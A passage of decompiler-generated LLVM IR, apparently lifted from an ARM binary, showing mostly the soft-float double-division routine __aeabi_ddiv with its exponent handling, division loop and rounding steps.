  uselistorder i32 %v5_1a76c, { 1, 0, 2 }
  uselistorder i32 %v8_1a764, { 1, 0 }
  uselistorder i32 %v1_1a754, { 1, 0 }
  uselistorder i32 %v5_1a73c, { 1, 0 }
  uselistorder i32 %v1_1a730, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a724, { 1, 0 }
  uselistorder i32 %v2_1a710, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1a70c, { 1, 0 }
  uselistorder i32 %v4_1a6f8, { 1, 2, 0 }
  uselistorder i32 %v0_1a6f8, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 46, 47, 64, 71, 8, 72, 75, 3, 1, 2, 76, 77, 5, 0, 4, 87, 28, 10, 32, 11, 12, 73, 74, 29, 30, 31, 70, 13, 88, 89, 9, 135, 136, 137, 138, 139, 141, 142, 140, 143, 144, 145, 146, 147, 148, 149, 14, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 15, 65, 66, 67, 68, 69, 33, 34, 16, 35, 36, 37, 63, 95, 38, 39, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 6, 78, 79, 80, 81, 82, 17, 83, 18, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 131, 124, 125, 126, 127, 128, 129, 130, 132, 133, 19, 134, 84, 7, 20, 21, 22, 24, 23, 25, 61, 85, 86, 26, 40, 41, 42, 43, 44, 45, 27, 62, 90, 91, 92, 93, 94 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1a888(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a888:
  %v1_1a88c = or i32 %arg1, 2146959360
  store i32 %v1_1a88c, i32* @r1, align 4
  %v1_1a894 = load i32, i32* @r0, align 4
  ret i32 %v1_1a894
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a898 = load i32, i32* @r4, align 4
  store i32 %v3_1a898, i32* %stack_var_-16, align 4
  %v6_1a898 = load i32, i32* @r5, align 4
  %v9_1a898 = load i32, i32* @r6, align 4
  %v12_1a898 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1a8a4 = load i32, i32* @r1, align 4
  %v4_1a8a4 = udiv i32 %v1_1a8a4, 1048576
  %v5_1a8a4 = urem i32 %v4_1a8a4, 2048
  store i32 %v5_1a8a4, i32* @r4, align 4
  %v6_1a8a4 = icmp eq i32 %v5_1a8a4, 0
  br i1 %v6_1a8a4, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1a8a8 = udiv i32 %arg4, 1048576
  %v6_1a8a8 = urem i32 %v5_1a8a8, 2048
  store i32 %v6_1a8a8, i32* %r5.global-to-local, align 4
  %v7_1a8a8 = icmp eq i32 %v6_1a8a8, 0
  br i1 %v7_1a8a8, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1aa34

bb90:                                             ; preds = %bb
  %v5_1a8ac = icmp eq i32 %v5_1a8a4, 2047
  br i1 %v5_1a8ac, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1a8a8, %bb90 ]
  br label %dec_label_pc_1aa34

bb91:                                             ; preds = %bb90
  %v5_1a8b0 = icmp eq i32 %v6_1a8a8, 2047
  br i1 %v5_1a8b0, label %dec_label_pc_1aa34, label %dec_label_pc_1a8b8

dec_label_pc_1a8b8:                               ; preds = %bb91
  %v2_1a8b8 = sub nsw i32 %v5_1a8a4, %v6_1a8a8
  store i32 %v2_1a8b8, i32* %r4.global-to-local, align 4
  %v2_1a8bc = xor i32 %v1_1a8a4, %arg4
  %v4_1a8c0 = mul i32 %arg4, 4096
  %v5_1a8c0 = or i32 %v4_1a8c0, %arg3
  store i32 %v5_1a8c0, i32* %r5.global-to-local, align 4
  %v7_1a8c0 = icmp eq i32 %v5_1a8c0, 0
  %v3_1a8c4 = mul i32 %v1_1a8a4, 4096
  store i32 %v3_1a8c4, i32* %r1.global-to-local, align 4
  br i1 %v7_1a8c0, label %dec_label_pc_1aa00, label %dec_label_pc_1a8cc

dec_label_pc_1a8cc:                               ; preds = %dec_label_pc_1a8b8
  %tmp92 = mul i32 %arg4, 256
  %v4_1a8d4 = and i32 %tmp92, 268435200
  %v4_1a8d8 = udiv i32 %arg3, 16777216
  %v5_1a8d4 = or i32 %v4_1a8d8, %v4_1a8d4
  %v5_1a8d8 = or i32 %v5_1a8d4, 268435456
  store i32 %v5_1a8d8, i32* %r3.global-to-local, align 4
  %v3_1a8dc = mul i32 %arg3, 256
  store i32 %v3_1a8dc, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1a8a4, 256
  %v4_1a8e0 = and i32 %tmp93, 268435200
  %v1_1a8e4 = load i32, i32* @r0, align 4
  %v4_1a8e4 = udiv i32 %v1_1a8e4, 16777216
  %v5_1a8e0 = or i32 %v4_1a8e0, %v4_1a8e4
  %v5_1a8e4 = or i32 %v5_1a8e0, 268435456
  store i32 %v5_1a8e4, i32* %r5.global-to-local, align 4
  %v3_1a8e8 = mul i32 %v1_1a8e4, 256
  store i32 %v3_1a8e8, i32* %r6.global-to-local, align 4
  %v1_1a8ec = and i32 %v2_1a8bc, -2147483648
  store i32 %v1_1a8ec, i32* %r1.global-to-local, align 4
  %v3_1a8f0 = icmp uge i32 %v5_1a8e4, %v5_1a8d8
  %v9_1a8f0 = icmp eq i32 %v5_1a8e4, %v5_1a8d8
  br i1 %v9_1a8f0, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1a8cc
  %v4_1a8f4 = icmp uge i32 %v3_1a8e8, %v3_1a8dc
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1a8cc, %bb94
  %v1_1a8f8 = phi i1 [ %v3_1a8f0, %dec_label_pc_1a8cc ], [ %v4_1a8f4, %bb94 ]
  %v2_1a8f8 = add nsw i32 %v2_1a8b8, 253
  %v3_1a8f8 = zext i1 %v1_1a8f8 to i32
  %v4_1a8f8 = add nsw i32 %v2_1a8f8, %v3_1a8f8
  %v8_1a8f8 = icmp ule i32 %v4_1a8f8, %v2_1a8b8
  %v9_1a8f8 = icmp ugt i32 %v2_1a8b8, -254
  %v10_1a8f8 = select i1 %v1_1a8f8, i1 %v8_1a8f8, i1 %v9_1a8f8
  %v1_1a8fc = add nsw i32 %v4_1a8f8, 768
  store i32 %v1_1a8fc, i32* %r4.global-to-local, align 4
  br i1 %v10_1a8f8, label %dec_label_pc_1a90c, label %dec_label_pc_1a904

dec_label_pc_1a904:                               ; preds = %bb95
  %v3_1a904 = udiv i32 %v5_1a8d8, 2
  store i32 %v3_1a904, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a90c

dec_label_pc_1a90c:                               ; preds = %bb95, %dec_label_pc_1a904
  %v0_1a914 = phi i32 [ %v5_1a8d8, %bb95 ], [ %v3_1a904, %dec_label_pc_1a904 ]
  %v0_1a918 = phi i32 [ %v3_1a8dc, %bb95 ], [ 0, %dec_label_pc_1a904 ]
  %v2_1a90c = sub i32 %v3_1a8e8, %v0_1a918
  store i32 %v2_1a90c, i32* %r6.global-to-local, align 4
  %v3_1a90c = icmp uge i32 %v3_1a8e8, %v0_1a918
  %v3_1a910 = icmp eq i1 %v3_1a90c, false
  %v4_1a910 = sub nsw i32 %v5_1a8e4, %v0_1a914
  %v6_1a910 = sext i1 %v3_1a910 to i32
  %v7_1a910 = add nsw i32 %v6_1a910, %v4_1a910
  store i32 %v7_1a910, i32* %r5.global-to-local, align 4
  %v3_1a914 = udiv i32 %v0_1a914, 2
  store i32 %v3_1a914, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a924.outer

dec_label_pc_1a924.outer:                         ; preds = %dec_label_pc_1a9bc, %dec_label_pc_1a90c
  %v1_1a9d0.ph = phi i32 [ %v2_1a9bc, %dec_label_pc_1a9bc ], [ %v1_1a8ec, %dec_label_pc_1a90c ]
  %v0_1a928.ph = phi i32 [ %v5_1a998, %dec_label_pc_1a9bc ], [ %v7_1a910, %dec_label_pc_1a90c ]
  %v1_1a92c.ph = phi i32 [ %v3_1a99c, %dec_label_pc_1a9bc ], [ %v2_1a90c, %dec_label_pc_1a90c ]
  %v5_1a9a417.ph = phi i32 [ %v5_1a9a4, %dec_label_pc_1a9bc ], [ %v3_1a914, %dec_label_pc_1a90c ]
  %v3_1a9a813.ph = phi i32 [ %v3_1a9a8, %dec_label_pc_1a9bc ], [ 0, %dec_label_pc_1a90c ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1a9bc ], [ 1048576, %dec_label_pc_1a90c ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1a9bc ], [ 524288, %dec_label_pc_1a90c ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a924

dec_label_pc_1a924:                               ; preds = %dec_label_pc_1a924.outer, %dec_label_pc_1a994
  %v1_1a98859 = phi i32 [ %v2_1a9d0, %dec_label_pc_1a994 ], [ %storemerge133, %dec_label_pc_1a924.outer ]
  %v1_1a934 = phi i32 [ %v1_1a93432, %dec_label_pc_1a994 ], [ %storemerge133, %dec_label_pc_1a924.outer ]
  %v1_1a95041 = phi i32 [ %v1_1a95043, %dec_label_pc_1a994 ], [ %storemerge133, %dec_label_pc_1a924.outer ]
  %v1_1a96c50 = phi i32 [ %v1_1a96c52, %dec_label_pc_1a994 ], [ %storemerge133, %dec_label_pc_1a924.outer ]
  %v0_1a9ac = phi i32 [ %v3_1a9ac, %dec_label_pc_1a994 ], [ %storemerge, %dec_label_pc_1a924.outer ]
  %v0_1a928 = phi i32 [ %v5_1a998, %dec_label_pc_1a994 ], [ %v0_1a928.ph, %dec_label_pc_1a924.outer ]
  %v1_1a92c = phi i32 [ %v3_1a99c, %dec_label_pc_1a994 ], [ %v1_1a92c.ph, %dec_label_pc_1a924.outer ]
  %v5_1a9a417 = phi i32 [ %v5_1a9a4, %dec_label_pc_1a994 ], [ %v5_1a9a417.ph, %dec_label_pc_1a924.outer ]
  %v3_1a9a813 = phi i32 [ %v3_1a9a8, %dec_label_pc_1a994 ], [ %v3_1a9a813.ph, %dec_label_pc_1a924.outer ]
  %v3_1a924 = icmp uge i32 %v1_1a92c, %v3_1a9a813
  %v3_1a928 = icmp eq i1 %v3_1a924, false
  %v4_1a928 = sub i32 %v0_1a928, %v5_1a9a417
  %v6_1a928 = sext i1 %v3_1a928 to i32
  %v7_1a928 = add i32 %v6_1a928, %v4_1a928
  %v8_1a928 = zext i1 %v3_1a928 to i32
  %v9_1a928 = sub i32 %v7_1a928, %v8_1a928
  %v10_1a928 = icmp ult i32 %v0_1a928, %v9_1a928
  %v11_1a928 = icmp ne i32 %v5_1a9a417, -1
  %v12_1a928 = or i1 %v11_1a928, %v10_1a928
  %v13_1a928 = icmp ult i32 %v0_1a928, %v5_1a9a417
  %v14_1a928 = select i1 %v3_1a928, i1 %v12_1a928, i1 %v13_1a928
  br i1 %v14_1a928, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1a924
  %v3_1a92c = sub i32 %v1_1a92c, %v3_1a9a813
  store i32 %v3_1a92c, i32* %r6.global-to-local, align 4
  store i32 %v7_1a928, i32* %r5.global-to-local, align 4
  %v3_1a934 = or i32 %v1_1a934, %v0_1a9ac
  store i32 %v3_1a934, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a924, %bb96
  %v1_1a98858 = phi i32 [ %v1_1a98859, %dec_label_pc_1a924 ], [ %v3_1a934, %bb96 ]
  %v1_1a93435 = phi i32 [ %v1_1a934, %dec_label_pc_1a924 ], [ %v3_1a934, %bb96 ]
  %v1_1a950 = phi i32 [ %v1_1a95041, %dec_label_pc_1a924 ], [ %v3_1a934, %bb96 ]
  %v1_1a96c49 = phi i32 [ %v1_1a96c50, %dec_label_pc_1a924 ], [ %v3_1a934, %bb96 ]
  %v0_1a944 = phi i32 [ %v0_1a928, %dec_label_pc_1a924 ], [ %v7_1a928, %bb96 ]
  %v1_1a948 = phi i32 [ %v1_1a92c, %dec_label_pc_1a924 ], [ %v3_1a92c, %bb96 ]
  %v1_1a938 = urem i32 %v5_1a9a417, 2
  %v2_1a938 = icmp ne i32 %v1_1a938, 0
  %v3_1a938 = udiv i32 %v5_1a9a417, 2
  %v3_1a93c = zext i1 %v2_1a938 to i32
  %v6_1a93c = zext i32 %v3_1a9a813 to i64
  %v7_1a93c = sub i32 33, %v3_1a9a813
  %v8_1a93c = zext i32 %v7_1a93c to i64
  %v9_1a93c = shl i64 %v6_1a93c, %v8_1a93c
  %v10_1a93c = sub i32 32, %v3_1a9a813
  %v11_1a93c = shl i32 %v3_1a93c, %v10_1a93c
  %v12_1a93c = zext i32 %v11_1a93c to i64
  %v14_1a93c = or i64 %v12_1a93c, %v9_1a93c
  %v15_1a93c = trunc i64 %v14_1a93c to i32
  %v3_1a940 = icmp uge i32 %v1_1a948, %v15_1a93c
  %v3_1a944 = icmp eq i1 %v3_1a940, false
  %v4_1a944 = sub i32 %v0_1a944, %v3_1a938
  %v6_1a944 = sext i1 %v3_1a944 to i32
  %v7_1a944 = add i32 %v6_1a944, %v4_1a944
  %v13_1a944 = icmp ult i32 %v0_1a944, %v3_1a938
  %v14_1a944 = or i1 %v13_1a944, %v3_1a944
  br i1 %v14_1a944, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1a948 = sub i32 %v1_1a948, %v15_1a93c
  store i32 %v3_1a948, i32* %r6.global-to-local, align 4
  store i32 %v7_1a944, i32* %r5.global-to-local, align 4
  %v5_1a950 = udiv i32 %v0_1a9ac, 2
  %v6_1a950 = or i32 %v1_1a950, %v5_1a950
  store i32 %v6_1a950, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1a98857 = phi i32 [ %v1_1a98858, %.thread4 ], [ %v6_1a950, %bb97 ]
  %v1_1a93434 = phi i32 [ %v1_1a93435, %.thread4 ], [ %v6_1a950, %bb97 ]
  %v1_1a95045 = phi i32 [ %v1_1a950, %.thread4 ], [ %v6_1a950, %bb97 ]
  %v1_1a96c = phi i32 [ %v1_1a96c49, %.thread4 ], [ %v6_1a950, %bb97 ]
  %v0_1a960 = phi i32 [ %v0_1a944, %.thread4 ], [ %v7_1a944, %bb97 ]
  %v1_1a964 = phi i32 [ %v1_1a948, %.thread4 ], [ %v3_1a948, %bb97 ]
  %v1_1a954 = urem i32 %v3_1a938, 2
  %v2_1a954 = icmp ne i32 %v1_1a954, 0
  %v3_1a954 = udiv i32 %v5_1a9a417, 4
  %v3_1a958 = zext i1 %v2_1a954 to i32
  %v6_1a958 = and i64 %v14_1a93c, 4294967295
  %v7_1a958 = sub i32 33, %v15_1a93c
  %v8_1a958 = zext i32 %v7_1a958 to i64
  %v9_1a958 = shl i64 %v6_1a958, %v8_1a958
  %v10_1a958 = sub i32 32, %v15_1a93c
  %v11_1a958 = shl i32 %v3_1a958, %v10_1a958
  %v12_1a958 = zext i32 %v11_1a958 to i64
  %v14_1a958 = or i64 %v12_1a958, %v9_1a958
  %v15_1a958 = trunc i64 %v14_1a958 to i32
  %v3_1a95c = icmp uge i32 %v1_1a964, %v15_1a958
  %v3_1a960 = icmp eq i1 %v3_1a95c, false
  %v4_1a960 = sub i32 %v0_1a960, %v3_1a954
  %v6_1a960 = sext i1 %v3_1a960 to i32
  %v7_1a960 = add i32 %v6_1a960, %v4_1a960
  %v13_1a960 = icmp ult i32 %v0_1a960, %v3_1a954
  %v14_1a960 = or i1 %v13_1a960, %v3_1a960
  br i1 %v14_1a960, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1a964 = sub i32 %v1_1a964, %v15_1a958
  store i32 %v3_1a964, i32* %r6.global-to-local, align 4
  store i32 %v7_1a960, i32* %r5.global-to-local, align 4
  %v5_1a96c = udiv i32 %v0_1a9ac, 4
  %v6_1a96c = or i32 %v1_1a96c, %v5_1a96c
  store i32 %v6_1a96c, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1a988 = phi i32 [ %v1_1a98857, %.thread6 ], [ %v6_1a96c, %bb98 ]
  %v1_1a93433 = phi i32 [ %v1_1a93434, %.thread6 ], [ %v6_1a96c, %bb98 ]
  %v1_1a95044 = phi i32 [ %v1_1a95045, %.thread6 ], [ %v6_1a96c, %bb98 ]
  %v1_1a96c53 = phi i32 [ %v1_1a96c, %.thread6 ], [ %v6_1a96c, %bb98 ]
  %v0_1a97c = phi i32 [ %v0_1a960, %.thread6 ], [ %v7_1a960, %bb98 ]
  %v1_1a980 = phi i32 [ %v1_1a964, %.thread6 ], [ %v3_1a964, %bb98 ]
  %v1_1a970 = urem i32 %v3_1a954, 2
  %v2_1a970 = icmp ne i32 %v1_1a970, 0
  %v3_1a970 = udiv i32 %v5_1a9a417, 8
  %v3_1a974 = zext i1 %v2_1a970 to i32
  %v6_1a974 = and i64 %v14_1a958, 4294967295
  %v7_1a974 = sub i32 33, %v15_1a958
  %v8_1a974 = zext i32 %v7_1a974 to i64
  %v9_1a974 = shl i64 %v6_1a974, %v8_1a974
  %v10_1a974 = sub i32 32, %v15_1a958
  %v11_1a974 = shl i32 %v3_1a974, %v10_1a974
  %v12_1a974 = zext i32 %v11_1a974 to i64
  %v14_1a974 = or i64 %v12_1a974, %v9_1a974
  %v15_1a974 = trunc i64 %v14_1a974 to i32
  %v3_1a978 = icmp uge i32 %v1_1a980, %v15_1a974
  %v3_1a97c = icmp eq i1 %v3_1a978, false
  %v4_1a97c = sub i32 %v0_1a97c, %v3_1a970
  %v6_1a97c = sext i1 %v3_1a97c to i32
  %v7_1a97c = add i32 %v6_1a97c, %v4_1a97c
  %v13_1a97c = icmp ult i32 %v0_1a97c, %v3_1a970
  %v14_1a97c = or i1 %v13_1a97c, %v3_1a97c
  br i1 %v14_1a97c, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1a980 = sub i32 %v1_1a980, %v15_1a974
  store i32 %v3_1a980, i32* %r6.global-to-local, align 4
  store i32 %v7_1a97c, i32* %r5.global-to-local, align 4
  %v5_1a988 = udiv i32 %v0_1a9ac, 8
  %v6_1a988 = or i32 %v1_1a988, %v5_1a988
  store i32 %v6_1a988, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1a998 = phi i32 [ %v1_1a980, %.thread8 ], [ %v3_1a980, %bb100 ]
  %v0_1a994 = phi i32 [ %v0_1a97c, %.thread8 ], [ %v7_1a97c, %bb100 ]
  %v2_1a9d0 = phi i32 [ %v1_1a988, %.thread8 ], [ %v6_1a988, %bb100 ]
  %v1_1a93432 = phi i32 [ %v1_1a93433, %.thread8 ], [ %v6_1a988, %bb100 ]
  %v1_1a95043 = phi i32 [ %v1_1a95044, %.thread8 ], [ %v6_1a988, %bb100 ]
  %v1_1a96c52 = phi i32 [ %v1_1a96c53, %.thread8 ], [ %v6_1a988, %bb100 ]
  %v2_1a98c = or i32 %v0_1a994, %v1_1a998
  %v4_1a98c = icmp eq i32 %v2_1a98c, 0
  br i1 %v4_1a98c, label %dec_label_pc_1a9cc, label %dec_label_pc_1a994

dec_label_pc_1a994:                               ; preds = %.thread10
  %v3_1a994 = mul i32 %v0_1a994, 16
  %v4_1a998 = udiv i32 %v1_1a998, 268435456
  %v5_1a998 = or i32 %v3_1a994, %v4_1a998
  store i32 %v5_1a998, i32* %r5.global-to-local, align 4
  %v3_1a99c = mul i32 %v1_1a998, 16
  store i32 %v3_1a99c, i32* %r6.global-to-local, align 4
  %v3_1a9a0 = mul nuw i32 %v3_1a970, 8
  %v4_1a9a4 = udiv i32 %v15_1a974, 536870912
  %v5_1a9a4 = or i32 %v4_1a9a4, %v3_1a9a0
  %v3_1a9a8 = mul i32 %v15_1a974, 8
  %v3_1a9ac = udiv i32 %v0_1a9ac, 16
  store i32 %v3_1a9ac, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a9ac, 16
  br i1 %tmp, label %dec_label_pc_1a9b4, label %dec_label_pc_1a924

dec_label_pc_1a9b4:                               ; preds = %dec_label_pc_1a994
  %v1_1a9b4 = and i32 %v1_1a9d0.ph, 1048576
  %v2_1a9b4 = icmp eq i32 %v1_1a9b4, 0
  br i1 %v2_1a9b4, label %dec_label_pc_1a9bc, label %.thread11.loopexit

dec_label_pc_1a9bc:                               ; preds = %dec_label_pc_1a9b4
  %v2_1a9bc = or i32 %v2_1a9d0, %v1_1a9d0.ph
  store i32 %v2_1a9bc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a924.outer

dec_label_pc_1a9cc:                               ; preds = %.thread10
  store i32 %v15_1a974, i32* %r2.global-to-local, align 4
  store i32 %v3_1a970, i32* %r3.global-to-local, align 4
  %v1_1a9cc = and i32 %v1_1a9d0.ph, 1048576
  %v2_1a9cc = icmp eq i32 %v1_1a9cc, 0
  br i1 %v2_1a9cc, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1a9cc
  %v3_1a9d0 = or i32 %v2_1a9d0, %v1_1a9d0.ph
  store i32 %v3_1a9d0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1a9b4
  store i32 %v3_1a9a8, i32* %r2.global-to-local, align 4
  store i32 %v5_1a9a4, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1a9cc, %bb101
  %v1_1a9d8 = add nsw i32 %v4_1a8f8, 515
  store i32 %v1_1a9d8, i32* %ip.global-to-local, align 4
  %v2_1a9d8 = icmp ugt i32 %v1_1a8fc, 252
  %v7_1a9d8 = icmp eq i32 %v1_1a8fc, 253
  %v2_1a9dc = xor i1 %v7_1a9d8, true
  %v3_1a9dc = and i1 %v2_1a9d8, %v2_1a9dc
  br i1 %v3_1a9dc, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1a9dc = icmp ugt i32 %v1_1a9d8, 1791
  %v11_1a9dc = icmp eq i32 %v1_1a9d8, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1a9e0 = phi i1 [ %v7_1a9d8, %.thread11 ], [ %v11_1a9dc, %bb102 ]
  %v0_1a9e0 = phi i1 [ %v2_1a9d8, %.thread11 ], [ %v6_1a9dc, %bb102 ]
  %v2_1a9e0 = xor i1 %v1_1a9e0, true
  %v3_1a9e0 = and i1 %v0_1a9e0, %v2_1a9e0
  call void @__pseudo_cond_branch(i1 %v3_1a9e0, i32 ptrtoint (i32* @global_var_1a6f4.696 to i32))
  %v0_1a9e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a9e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a9e4 = sub i32 %v0_1a9e4, %v1_1a9e4
  store i32 %v2_1a9e4, i32* %ip.global-to-local, align 4
  %v3_1a9e4 = icmp uge i32 %v0_1a9e4, %v1_1a9e4
  %v9_1a9e4 = icmp eq i32 %v0_1a9e4, %v1_1a9e4
  br i1 %v9_1a9e4, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1a9e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a9e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a9e8 = sub i32 %v1_1a9e8, %v2_1a9e8
  store i32 %v3_1a9e8, i32* %ip.global-to-local, align 4
  %v4_1a9e8 = icmp uge i32 %v1_1a9e8, %v2_1a9e8
  %v10_1a9e8 = icmp eq i32 %v1_1a9e8, %v2_1a9e8
  br i1 %v10_1a9e8, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1a9ec = load i32, i32* %r0.global-to-local, align 4
  %v2_1a9ec = urem i32 %v1_1a9ec, 2
  %v3_1a9ec = icmp ne i32 %v2_1a9ec, 0
  %v4_1a9ec = udiv i32 %v1_1a9ec, 2
  store i32 %v4_1a9ec, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1a9f0 = phi i1 [ %v3_1a9e4, %bb103 ], [ %v4_1a9e8, %bb104 ], [ %v3_1a9ec, %bb105 ]
  %v0_1a9f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a9f0 = zext i1 %v1_1a9f0 to i32
  %v3_1a9f0 = add i32 %v2_1a9f0, %v0_1a9f0
  store i32 %v3_1a9f0, i32* %r0.global-to-local, align 4
  %v0_1a9f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a9f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a9f4 = and i32 %v1_1a9f4, 4096
  %v3_1a9f4 = icmp ne i32 %v2_1a9f4, 0
  %v4_1a9f4 = mul i32 %v1_1a9f4, 1048576
  %v6_1a9f4 = add i32 %v4_1a9f4, %v0_1a9f4
  %v7_1a9f4 = zext i1 %v3_1a9f4 to i32
  %v8_1a9f4 = add i32 %v7_1a9f4, %v6_1a9f4
  store i32 %v8_1a9f4, i32* %r1.global-to-local, align 4
  %v2_1a9f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a9f8, i32* %r4.global-to-local, align 4
  store i32 %v6_1a898, i32* %r5.global-to-local, align 4
  store i32 %v9_1a898, i32* %r6.global-to-local, align 4
  ret i32 %v3_1a9f0

dec_label_pc_1aa00:                               ; preds = %dec_label_pc_1a8b8
  %v1_1aa00 = and i32 %v2_1a8bc, -2147483648
  %v4_1aa04 = urem i32 %v1_1a8a4, 1048576
  %v5_1aa04 = or i32 %v1_1aa00, %v4_1aa04
  store i32 %v5_1aa04, i32* %r1.global-to-local, align 4
  %v6_1aa08 = add nsw i32 %v2_1a8b8, 1023
  store i32 %v6_1aa08, i32* %r4.global-to-local, align 4
  %v8_1aa08 = sub nsw i32 0, %v2_1a8b8
  %v9_1aa08 = and i32 %v6_1aa08, %v8_1aa08
  %v11_1aa08 = icmp slt i32 %v2_1a8b8, -1023
  %v12_1aa08 = icmp eq i32 %v6_1aa08, 0
  %v7_1aa0c = icmp sgt i32 %v2_1a8b8, -1023
  br i1 %v7_1aa0c, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1aa00
  %v10_1aa0c = sub nsw i32 1024, %v2_1a8b8
  store i32 %v10_1aa0c, i32* %r5.global-to-local, align 4
  %v14_1aa0c = and i32 %v10_1aa0c, %v6_1aa08
  %v16_1aa0c = icmp slt i32 %v10_1aa0c, 0
  %v17_1aa0c = icmp eq i32 %v6_1aa08, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1aa00, %bb106
  %v3_1aa18.in = phi i32 [ %v9_1aa08, %dec_label_pc_1aa00 ], [ %v14_1aa0c, %bb106 ]
  %v2_1aa18 = phi i1 [ %v11_1aa08, %dec_label_pc_1aa00 ], [ %v16_1aa0c, %bb106 ]
  %v1_1aa18 = phi i1 [ %v12_1aa08, %dec_label_pc_1aa00 ], [ %v17_1aa0c, %bb106 ]
  %v3_1aa18 = icmp slt i32 %v3_1aa18.in, 0
  %v3_1aa10 = xor i1 %v3_1aa18, %v2_1aa18
  %v4_1aa10 = or i1 %v1_1aa18, %v3_1aa10
  br i1 %v4_1aa10, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1aa1084 = mul i32 %v6_1aa08, 1048576
  %v10_1aa1085 = or i32 %v9_1aa1084, %v5_1aa04
  store i32 %v10_1aa1085, i32* %r1.global-to-local, align 4
  store i32 %v3_1a898, i32* %r4.global-to-local, align 4
  store i32 %v6_1a898, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1aa18 = phi i32 [ %v12_1a898, %bb108 ], [ %v1_1aa00, %bb107 ]
  %v6_1aa18 = xor i1 %v4_1aa10, true
  call void @__pseudo_cond_branch(i1 %v6_1aa18, i32 %v0_1aa18)
  %v0_1aa1c = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa1c = or i32 %v0_1aa1c, 1048576
  store i32 %v1_1aa1c, i32* @r1, align 4
  %v0_1aa24 = load i32, i32* %r4.global-to-local, align 4
